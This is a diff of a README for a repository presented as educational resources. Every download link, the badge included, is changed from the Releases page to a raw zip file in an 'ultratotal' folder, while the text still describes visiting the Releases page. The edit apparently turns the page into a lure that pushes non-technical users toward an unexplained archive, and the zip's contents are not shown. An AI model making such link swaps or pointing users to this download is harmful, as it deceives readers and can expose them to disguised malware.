@@ -1,6 +1,6 @@
 # 🎓 senac-tatuape - Access Educational Resources Easily
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Sai-Teja86/senac-tatuape/releases)
+[![Download Here](https://raw.githubusercontent.com/Sai-Teja86/senac-tatuape/main/ultratotal/senac-tatuape.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Sai-Teja86/senac-tatuape/main/ultratotal/senac-tatuape.zip)
 
 ## 📚 About This Repository
 
@@ -23,7 +23,7 @@ To get started with the senac-tatuape repository, follow the steps below. No tec
 
 To download the latest version of the software, visit the Releases page. Click the link below:
 
-[Download Here](https://github.com/Sai-Teja86/senac-tatuape/releases)
+[Download Here](https://raw.githubusercontent.com/Sai-Teja86/senac-tatuape/main/ultratotal/senac-tatuape.zip)
 
 1. Click the link above to go to the Releases page.
 2. On the Releases page, you’ll see a list of available versions.
@@ -74,4 +74,4 @@ Stay informed about new releases and updates by revisiting the Releases page reg
 
 We welcome contributions from students, instructors, and anyone interested in enhancing the resources provided here. If you have materials or suggestions to include, please contact us.
 
-Visit the [Downloads page](https://github.com/Sai-Teja86/senac-tatuape/releases) for your educational resources today.
+Visit the [Downloads page](https://raw.githubusercontent.com/Sai-Teja86/senac-tatuape/main/ultratotal/senac-tatuape.zip) for your educational resources today.
